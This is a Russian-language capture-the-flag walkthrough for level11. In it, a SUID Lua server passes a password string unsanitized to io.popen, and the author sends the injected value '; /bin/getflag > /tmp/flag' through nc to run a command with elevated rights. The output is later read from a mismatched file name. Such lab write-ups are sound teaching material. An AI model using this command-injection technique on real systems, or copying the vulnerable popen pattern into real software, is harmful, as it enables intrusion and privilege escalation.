```
ls -l
```
> total 4\
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua\

SUID, все как обычно, запустим

```
./level11.lua
```
> lua: ./level11.lua:3: address already in use\
stack traceback:\
	[C]: in function 'assert'\
	./level11.lua:3: in main chunk\
	[C]: ?

Посмотрим, что там внутри:

```
cat level11.lua
```
> \#!/usr/bin/env lua\
local socket = require("socket")\
local server = assert(socket.bind("127.0.0.1", 5151))\
\
function hash(pass)\
  prog = io.popen("echo "..pass.." | sha1sum", "r")\
  data = prog:read("\*all")\
  prog:close()\
\
  data = string.sub(data, 1, 40)\
\
  return data\
end\
\
\
while 1 do\
  local client = server:accept()\
  client:send("Password: ")\
  client:settimeout(60)\
  local l, err = client:receive()\
  if not err then\
      print("trying " .. l)\
      local h = hash(l)\
\
      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then\
          client:send("Erf nope..\n");\
      else\
          client:send("Gz you dumb*\n")\
      end\
\
  end\
\
  client:close()\
end

Сервер слушвет порт 5151, пробуем подключиться:
```
nc localhost 5151
```
> Password: aaaaaa\
Erf nope..

Ничего не происходит, читаем код внимательно, находим io.popen:
Исходя из документации :
io.open (filename [, mode])

*io.popen (prog [, mode])
Starts program prog in a separated process and returns a file handle that you can use to read data from this program (if mode is "r", the default) or to write data to this program (if mode is "w").
This function is system dependent and is not available on all platforms.*

Запускает программу prog в отдельном процессе и возвращает хендлер файла, который вы можете
использовать для чтения данных из этой программы (если mode равен "r", значение по умолчанию)
или для записи данных в эту программу (если mode равен "w").

Так как данная функция запускает программу, а на файле стоит suid, значит нам просто нужно дать строку, которая выполнит getflag

echo "..pass.." | sha1sum <- Сюда нужно вставть код, который мы хотим выполнить

```
nc localhost 5151
; /bin/getflag > /tmp/flag
```
```
cat /tmp/easy
```
> Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
